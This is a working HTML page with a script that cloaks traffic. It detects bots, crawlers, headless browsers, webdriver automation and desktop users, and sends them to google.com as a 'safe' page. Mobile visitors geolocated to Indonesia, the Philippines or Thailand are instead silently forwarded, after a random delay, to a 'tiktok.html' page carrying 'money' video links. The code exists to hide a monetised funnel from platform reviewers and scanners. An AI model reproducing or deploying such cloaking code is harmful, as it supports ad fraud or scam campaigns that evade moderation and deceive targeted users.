<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="referrer" content="no-referrer">
</head>

<body style="background:black;color:white;text-align:center;padding-top:40vh;font-family:sans-serif">
Please wait...

<script>
const CONFIG = {
  allowedCountries: ["ID", "PH", "TH"],
  mobileOnly: true,
  delayMin: 800,
  delayMax: 1800,

  offers: {
    a1: {
      money: [
        "https://cdn.videy.co/BHtcImHS1.mp4",
        "https://cdn.videy.co/pXNYp2ba1.mp4",
        "https://cdn.videy.co/BHtcImHS1.mp4"
      ],
      safe: "https://google.com"
    }
  }
};

const qs = new URLSearchParams(location.search);
const id = qs.get("id");

const ua = navigator.userAgent.toLowerCase();
const isMobile = /android|iphone|ipad|ipod/i.test(ua);
const isBotUA = /bot|crawl|spider|headless|preview|wget|curl/i.test(ua);
const isWebdriver = navigator.webdriver === true;

const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

async function getCountry() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const j = await r.json();
    return j.country || "";
  } catch {
    return "";
  }
}

(async () => {
  if (!CONFIG.offers[id]) return location.href = "https://google.com";
  if (isBotUA || isWebdriver) return location.href = CONFIG.offers[id].safe;
  if (CONFIG.mobileOnly && !isMobile) return location.href = CONFIG.offers[id].safe;

  const country = await getCountry();
  if (CONFIG.allowedCountries.length && !CONFIG.allowedCountries.includes(country))
    return location.href = CONFIG.offers[id].safe;

  const videos = CONFIG.offers[id].money.join("|");

  setTimeout(() => {
    location.replace("tiktok.html?v=" + encodeURIComponent(videos));
  }, rand(CONFIG.delayMin, CONFIG.delayMax));
})();
</script>

</body>
</html>
